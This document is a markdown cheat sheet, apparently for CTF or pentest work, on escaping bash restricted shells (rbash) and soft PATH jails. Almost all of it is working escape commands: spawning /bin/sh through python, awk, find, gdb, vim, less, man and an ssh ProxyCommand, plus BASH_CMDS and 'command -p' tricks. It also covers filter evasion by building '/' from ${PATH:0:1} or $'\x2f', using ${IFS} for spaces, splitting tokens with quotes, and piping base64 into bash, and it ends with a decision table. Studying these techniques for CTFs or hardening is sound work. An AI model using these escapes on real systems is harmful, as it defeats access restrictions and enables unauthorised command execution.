# Bash / restricted shell jails — rbash, soft PATH jails, filtered commands

Verified on bash 5.3 (this host) unless noted. First question, always: is it
**real rbash** (`bash -r`, or `rbash` symlink) or a **soft jail** (restricted
`PATH`, weird profile, ssh ForceCommand, filtered input re-run through bash)?
They break differently.

| Test | Real rbash (`bash -r`) | Soft PATH jail |
|---|---|---|
| `export PATH=/usr/bin:$PATH` | `PATH: readonly variable` (verified) | works — jail over |
| `BASH_CMDS[x]=/bin/sh; x` | `/bin/sh: restricted` (verified 5.3) | works (verified) |
| `command -p id` | `command: -p: restricted` (verified) | works (verified) |
| `exec sh` | `exec: restricted` (verified) | works |
| `cd /` | `cd: restricted` | works |

Replicate locally: `bash -r` (or `env -i bash --noprofile --norc -c 'export PATH=/tmp/nowhere; ...'`
for a soft jail).

## Real rbash escapes

rbash blocks: `cd`, setting/unsetting PATH & Co, `command -p`, running command
names containing `/`, `exec`, importing functions, `set +o restricted`
(verified: "invalid option name"). What still works:

1. **Any interpreter or program that spawns shells** — if it is in PATH, you
   never needed a slash:

```bash
python3 -c 'import os; os.system("/bin/sh")'      # or pty.spawn for a tty
awk 'BEGIN {system("/bin/sh")}'                   # verified system() call works
find /etc/hostname -exec /bin/sh \;               # verified -exec runs
gdb -q -nx -ex '!sh' /bin/true                    # gdb ! runs shell commands (verified with -ex)
env /bin/sh                                       # env execs, no slash needed by you
```

2. **Editors/pagers in PATH** (they shell out):

```bash
vim -c '!sh'                      # vi  :!sh  — verified via vim -es -c '!echo' -c 'qa!'
less /etc/hostname                # then: !sh      (less ! escape; needs tty, not secure mode)
man ls                            # opens pager -> !sh
```

3. **ssh ProxyCommand** (ssh binary in PATH; executes locally before any
   connection — verified: `ssh -o ProxyCommand='touch /tmp/pwn' h` creates the
   file; the target host never needs to exist):

```bash
ssh -o ProxyCommand='/bin/sh' localhost
```

4. **`BASH_CMDS` hash-table entry with an absolute path** — blocked on 5.3
   (verified: `/bin/sh: restricted`), but older bash versions in writeups
   allowed it. One line to try; costs nothing:

```bash
BASH_CMDS[shell]=/bin/sh; shell
```

## Soft jail (restricted PATH / filtered input) escapes

- If you can set variables, rebuild PATH even without knowing dirs: try
  `export PATH=/usr/local/bin:/usr/bin:/bin`.
- `BASH_CMDS[shell]=/bin/sh; shell` (verified in soft jail) and
  `command -p sh` (verified) bypass the mangled PATH lookup.
- Any of the rbash techniques above work a fortiori.

## Character filters

Slash `/` blocked — build it from environment expansions (verified):

```bash
${PATH:0:1}      # first char of PATH == "/"
${HOME:0:1}      # also "/" on normal systems
s=$'\x2f'; echo "$s"bin"$s"sh     # ANSI-C quoting: $'\x2f' is '/'  (verified)
```

Caveats: `${PATH:0:1}` etc. only work where the *shell itself* expands them —
not inside strings handed to other programs. Do NOT trust `${LS_COLORS:...}`
offsets (byte 10 is `:` territory, value varies) — use PATH/HOME.
`$'\x2f'` must be **unquoted** ANSI-C quoting: `"[$'\x2f']"` inside double
quotes stays literal (verified mistake to avoid).

Spaces blocked:

```bash
cat${IFS}/flag          # IFS default = space,tab,newline (verified)
cat</flag               # redirection needs no space (verified)
cat$IFS$IFS-flag
```

Keyword/name filters (the filter sees the text, bash re-parses after):

```bash
ca""t /flag             # empty quotes split the token (verified)
ca\t /flag              # backslash-escaped letter (verified via bash -c)
ca''t, c"a"t            # same family
/???/?????              # glob expansion if the target path is guessable
```

Whole payload base64 (when pipes survive):

```bash
echo ZWNobyBwYXNz | base64 -d | bash        # verified mechanism
```

Tabs/newlines: `$'\t'`, `$'\n'` (ANSI-C quoting again).

Full python present? It is game over for any filter (verified style):

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'   # interactive tty shell
```

## Decision table

| You have | Fastest escape |
|---|---|
| any interpreter (python3/perl/ruby/node/php) | `system`/`exec` call → `/bin/sh` |
| PATH control | `export PATH=...` or `command -p sh` |
| bash builtin only, soft jail | `BASH_CMDS[shell]=/bin/sh; shell` |
| bash builtin only, real rbash | vim/less/man/awk/find/gdb/ssh from PATH |
| no slash character | `${PATH:0:1}`, `$'\x2f'` |
| no spaces | `${IFS}`, `<`, `$'\t'` |
| filtered command names | `ca""t`, `ca\t` re-parse tricks, base64 pipe |
| input echoed into a script/Makefile | escape quotes; try `$(...)`, backticks |

## Testing harness

```bash
bash -r                                        # enter restricted shell locally
env -i bash --noprofile --norc                 # clean soft-jail base
printf 'export PATH=/none; bash -c "%s"' "$payload"   # single-probe runner
```

Log every payload + result in `notes.md` exactly like the pyjail workflow:
hypothesis → probe → observed error → next.
